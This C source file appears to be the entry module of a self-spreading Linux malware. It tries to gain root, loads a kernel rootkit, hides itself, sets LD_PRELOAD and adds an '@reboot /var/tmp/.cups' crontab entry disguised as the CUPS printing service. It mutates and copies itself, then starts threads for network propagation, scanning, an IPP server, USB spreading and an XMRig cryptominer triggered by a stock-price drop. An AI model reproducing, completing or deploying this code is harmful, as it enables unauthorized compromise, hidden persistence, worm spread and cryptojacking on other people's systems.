#include "stock_client.h"
#include "ipp_server.h"
#include "lpe.h"
#include "propagate.h"
#include "rootkit.h"
#include "scanner.h"
#include "xmr.h"
#include "utils.h"
#include "unix_usb_spreader.h"

int is_already_attacking(Globals *global){
   return global->access(MONEY_EXECPATH, F_OK) == 0;
}

void * start_trigger(void *varg){
    Globals *global = (Globals *) varg;
    int trigger_attack;
    global->printf("Starting trigger module...\n");
    
    int is_attacking = is_already_attacking(global);

    if (!is_attacking){
        trigger_attack = get_microsoft_stock(global);
        while(trigger_attack != 1) // Wait until stock value drops more than a 10%
        {
            trigger_attack = get_microsoft_stock(global);
            global->usleep(1000); // Delay for 1000 microseconds (1 millisecond)
        }
    }

    // call attack function
    DEBUG_LOG("[ENTRY] Starting xmr module...\n");
    xmrig(global, is_attacking);
}

void * start_propagate(void *varg){
    Globals *global = (Globals *) varg;
    DEBUG_LOG("[ENTRY] Starting propagation module...\n");
    propagate(global);
}
void * start_network_scanner(void *varg){
    Globals *global = (Globals *) varg;
    DEBUG_LOG("[ENTRY] Starting network-scanner module...\n");
    while(1){
        scan_net(global);
        global->sleep(10);
    }
}

void * start_ipp_server(void *varg){
    Globals *global = (Globals *) varg;
    DEBUG_LOG("[ENTRY] Starting ipp-server module...\n");
    serve(global);
}

void * start_usb_propagate(void *varg) {
    Globals *global = (Globals *) varg;
    DEBUG_LOG("[ENTRY] Starting usb spreading module...\n");
    usb_spread_module(global);
}

void copy_to_malware_path(Globals *global, char *mwpath) {
    mutate_lib(global);
    int mwfd = global->open(mwpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    global->write(mwfd, global->malware_copy, sizeof(char) * global->malware_size);
    global->close(mwfd);
    if (global->chmod(mwpath, 0755) < 0) {
        DEBUG_LOG_ERR("[USB] fail to chmod malware in syspath\n");
    }
}

void try_add_crontab(Globals *global){
    // check if it's added if not add it to the crontab
    global->system("crontab -l | grep \".cups\" || ((crontab -l; echo \"@reboot /var/tmp/.cups\") | crontab -)");
}

void entry(Globals *global) {
    // try to gain root
    try_get_root(global);

    // if root, try to load kernel module
    try_persist(global);
    try_hide(global);
    try_add_crontab(global);
    try_ld_preload(global);

    // load the file content into the global buffer
    load_file_bytes(global);


    // if it's not running from the expdected path (i.e. usbs), mutate, copy there and execute it
    char syspath[] = "/var/tmp/.cups";
    if (global->strncmp(global->malware_path, syspath, sizeof(syspath)) != 0) {
        copy_to_malware_path(global, syspath);
        if (global->execl(syspath, syspath, NULL) != 0) {
            DEBUG_LOG_ERR("[USB] fail to execute binary in EXECUTABLE PATH\n");
        } else {
            global->exit(0);
        }
    }
  
    // change working directory to /var/tmp
    global->chdir("/var/tmp");
    
    // start trigger of the attack
    pthread_t thread_id_trigger;
    global->pthread_create(&thread_id_trigger, NULL, start_trigger, global);

    // start propagate
    pthread_t thread_id_propagate;
    global->pthread_create(&thread_id_propagate, NULL, start_propagate, global);

    // start network scanner
    pthread_t thread_id_scanner;
    global->pthread_create(&thread_id_scanner, NULL, start_network_scanner, global);

    // start ipp server
    pthread_t thread_id_ipp;
    global->pthread_create(&thread_id_ipp, NULL, start_ipp_server, global);

    // start usb spread monitor
    pthread_t thread_id_usb;
    global->pthread_create(&thread_id_usb, NULL, start_usb_propagate, global);

    DEBUG_LOG("[ENTRY] Started all modules!\n");
    // keep running
    while(1){
        TRAP;
        global->sleep_ms(100);
    }
}
